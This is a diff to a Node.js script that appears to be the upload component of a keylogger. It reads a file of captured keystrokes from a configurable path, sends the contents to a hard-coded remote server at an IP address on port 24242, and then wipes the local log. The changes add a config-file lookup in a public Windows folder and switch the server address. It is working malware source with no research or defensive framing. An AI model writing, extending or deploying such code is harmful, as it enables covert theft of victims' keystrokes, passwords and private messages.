@@ -1,9 +1,25 @@
 const axios = require("axios");
 const fs = require("fs");
 const os = require("os");
-const PATH = `D://Clientkeylog.txt`;
-const URL = "http://91.149.140.29:24242";
+const CONFIG_PATH = "C:\\Users\\Public\\keylogger_config.txt";
+const URL = "http://91.149.140.24:24242";
 const LONG_POLL_TIMEOUT = 300000;
+
+function getLogPath() {
+    try {
+        if (fs.existsSync(CONFIG_PATH)) {
+
+            const configContent = fs.readFileSync(CONFIG_PATH, "utf8").trim();
+            if (configContent) {
+                return configContent.replace(/\\/g, '/');
+            }
+        }
+        return "D://Clientkeylog.txt";
+        
+    } catch (error) {
+        return "D://Clientkeylog.txt"; 
+    }
+}
 
 //POST
 const sendData = async () => {
@@ -22,7 +38,7 @@ const sendData = async () => {
             timeout: 5000 
         });
 
-        fs.writeFileSync(PATH, '');
+        fs.writeFileSync(getLogPath(), '');
     }catch{
 
     }
@@ -30,9 +46,10 @@ const sendData = async () => {
 
 const getData = () => {
     try{
-        if(!fs.existsSync(PATH)) return null; 
+        let path = getLogPath();
+        if(!fs.existsSync(path)) return null; 
 
-        let fileData = fs.readFileSync(PATH, "utf8");
+        let fileData = fs.readFileSync(path, "utf8");
 
         if(fileData.trim() === "") return null;
 
